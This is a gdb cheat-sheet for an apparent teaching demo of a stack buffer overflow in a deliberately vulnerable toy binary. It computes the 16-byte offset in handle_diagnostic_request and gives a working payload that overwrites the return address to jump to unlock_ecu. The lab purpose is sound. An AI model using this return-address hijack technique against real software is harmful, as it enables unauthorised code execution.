# gdb Cheat-Sheet — Stack Overflow Demo

Handy `gdb` commands for the live demo (binary: `vuln`, target function:
`unlock_ecu`, vulnerable function: `handle_diagnostic_request`, buffer:
`char buf[8]`). The binary is built `-no-pie -fno-stack-protector -g -O0`, so
addresses are **fixed** (no ASLR) and there is **no stack canary**.

---

## 1. Start

```bash
gdb ./vuln            # load the binary
gdb -q ./vuln         # same, but quiet (no banner)
```

Inside gdb, `help <cmd>` explains any command. Press Enter to repeat the last
command. `Ctrl-D` or `quit` (`q`) exits.

---

## 2. Find the target address (`unlock_ecu`)

```gdb
(gdb) p/x &unlock_ecu            # fastest: prints the address in hex
$1 = 0x401196

(gdb) info address unlock_ecu    # same, with a sentence
Symbol "unlock_ecu" is static storage at address 0x401196.

(gdb) info functions unlock_ecu  # address + signature
0x0000000000401196  unlock_ecu
```

Confirm it really is the function (not a stub):

```gdb
(gdb) x/5i unlock_ecu            # show the first 5 instructions
   0x401196 <unlock_ecu>:     push   rbp
   0x401197 <unlock_ecu+1>:   mov    rbp,rsp
   ...
(gdb) disassemble unlock_ecu    # full disassembly
```

---

## 3. Inspect the vulnerable function

```gdb
(gdb) disassemble handle_diagnostic_request
(gdb) info line handle_diagnostic_request     # source file + line number
(gdb) list handle_diagnostic_request          # show the source
```

---

## 4. Break, run, step

```gdb
(gdb) break handle_diagnostic_request    # set a breakpoint (short: b)
(gdb) break main
(gdb) info breakpoints                    # list them
(gdb) run $(python3 -c 'print("A"*40)')   # run with an argument (short: r)
(gdb) continue                            # resume (c)
(gdb) stepi / nexti                       # one instruction (si / ni)
(gdb) step   / next                       # one source line (s / n)
(gdb) finish                              # run until the current function returns
```

---

## 5. Prove the offset is 16

With a breakpoint inside `handle_diagnostic_request` (after the prologue):

```gdb
(gdb) break handle_diagnostic_request
(gdb) run $(python3 -c 'print("A"*40)')
(gdb) p $rbp + 8 - (void*)&buf   # distance from buf to the return-address slot
$1 = 16
```

Why 16: `8` bytes for `buf[8]` + `8` bytes for the saved RBP = the return
address sits 16 bytes above the start of `buf`.

See the frame directly:

```gdb
(gdb) p &buf                     # address of the buffer
(gdb) p $rbp                     # saved-RBP slot is here; return addr is $rbp+8
(gdb) x/6gx $rbp-8               # dump buf, saved RBP, return address (8-byte words)
(gdb) info frame                 # frame layout, saved registers, return address
(gdb) bt                         # backtrace (call stack)
```

---

## 6. Watch the overwrite happen

```gdb
(gdb) break handle_diagnostic_request
(gdb) run $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*16 + b"\x96\x11\x40")')
(gdb) x/gx $rbp+8                # the return address slot...
(gdb) finish                     # ...step out and watch ret jump to unlock_ecu
```

Little-endian: `0x401196` is written as the bytes `\x96\x11\x40`. Only the three
non-zero bytes are supplied — `strcpy`'s terminating NUL provides the next zero
byte, so no `\x00` ever appears inside the input.

---

## 7. Check the binary's protections

```gdb
(gdb) info functions             # see all symbols
```

```bash
file ./vuln                      # "executable" = non-PIE (fixed addresses)
nm ./vuln | grep unlock_ecu      # 0000000000401196 T unlock_ecu
checksec --file=./vuln           # (pwntools) NX / PIE / Canary / RELRO summary
```

Expected for this demo: **No canary**, **No PIE**, NX usually enabled (we jump to
existing code, so NX doesn't stop us).

---

## 8. Registers & memory (reference)

```gdb
(gdb) info registers             # all registers (short: i r)
(gdb) p $rip                     # instruction pointer
(gdb) p $rsp / $rbp              # stack top / frame base
(gdb) x/16xb <addr>              # 16 bytes in hex
(gdb) x/8gx  <addr>              # 8 giant (8-byte) words in hex
(gdb) x/s    <addr>              # memory as a string
(gdb) x/i    $rip                # next instruction
```

---

## 9. Quit

```gdb
(gdb) quit        # or q, or Ctrl-D   (answer y if asked while running)
```

---

### One-line reminders

| Goal | Command |
|------|---------|
| Address of `unlock_ecu` | `p/x &unlock_ecu` |
| Disassemble a function | `disassemble <name>` |
| Breakpoint | `break <name>` |
| Run with input | `run $(python3 -c '...')` |
| Offset to return addr | `p $rbp + 8 - (void*)&buf` |
| Dump the stack frame | `x/6gx $rbp-8` |
| Step out of a function | `finish` |
| Exit | `quit` / `Ctrl-D` |
